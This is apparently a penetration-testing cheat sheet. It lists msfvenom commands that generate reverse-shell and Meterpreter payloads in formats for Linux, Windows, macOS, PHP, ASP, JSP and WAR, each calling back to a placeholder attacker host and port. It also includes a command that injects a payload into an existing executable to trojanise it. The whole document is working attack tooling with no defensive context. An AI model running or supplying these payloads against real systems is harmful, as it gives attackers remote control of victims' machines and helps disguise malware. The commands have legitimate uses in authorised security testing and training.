Linux ELF binary:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LIP> LPORT=<LPORT> -f elf > shell.elf

Windows EXE binary:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LIP> LPORT=<LPORT>-f exe > shell.exe

Windows Service:
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<LIP> LPORT=<LPORT> EXITFUNC=thread -f exe-service > shell-service.exe

Mac:
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<LIP> LPORT=<LPORT> -f macho > shell.macho

PHP:
msfvenom -p php/meterpreter/reverse_tcp LHOST=<LIP> LPORT=<LPORT> -f raw > /tmp/shell.php && sed -i 's/#<?php/<?php/' /tmp/shell.php

If you use php/reverse_php open the output file with an editor and add <?php and ?> within the script.

ASP:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LIP> LPORT=<LPORT> -f asp > shell.asp

JSP:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LIP> LPORT=<LPORT> -f raw > shell.jsp

WAR:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LIP> LPORT=<LPORT> -f war > shell.war

Inject payload into an existing exe file:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LIP> LPORT=<LPORT> -x <template EXE> -f exe > <output.exe>
